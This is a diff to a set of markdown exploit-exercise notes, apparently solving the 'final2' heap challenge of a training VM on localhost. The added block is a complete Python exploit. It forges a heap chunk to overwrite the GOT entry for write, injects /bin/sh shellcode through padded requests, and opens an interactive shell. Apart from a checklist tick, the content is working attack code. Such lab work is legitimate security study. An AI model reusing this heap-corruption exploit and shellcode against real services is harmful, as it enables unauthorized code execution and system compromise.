@@ -133,7 +133,55 @@ t = telnetlib.Telnet()
 t.sock = s
 t.interact()
 ```
-- [ ] final2
+- [x] final2
+```
+import struct
+import socket
+import telnetlib
+
+REQUZ=128
+
+HOST="127.0.0.1"
+PORT=2993
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((HOST,PORT))
+
+def padding(msg):
+    pad = '\x00'*(REQUZ-len(msg))
+    _msg = "FSRD"+msg+pad
+    return _msg[:REQUZ]
+
+malloc_vudoo=struct.pack("I",0xfffffffc)
+fake_chunk = malloc_vudoo+malloc_vudoo
+fake_chunk += struct.pack("I",0x804d41c-0xc) # GOT of write
+fake_chunk += struct.pack("I",0x804e020) # Address of heap
+
+#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+#shellcode = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+short_jump_10 = "\xeb\x0e"
+
+#s.send(padding("/ROOT///"+"/"*12+short_jump_10+"AABBBBCCCCDDDD"+"\xCC"*12+"/"*128))
+s.send(padding("/ROOT///"+"/"*12+short_jump_10+"AABBBBCCCCDDDD"+shellcode+"/"*128))
+s.send(padding("ROOT/"+fake_chunk))
+
+while True:
+    msg = raw_input("> ")
+    if msg:
+        print("MSG: "+repr(padding(msg)))
+        s.send(padding(msg))
+    else:
+        break
+
+s.send("id")
+print s.recv(1024)
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
 
 ## Create a Binary with no stack canary, executable stack and no PIE (Position Independent Code)
 ```
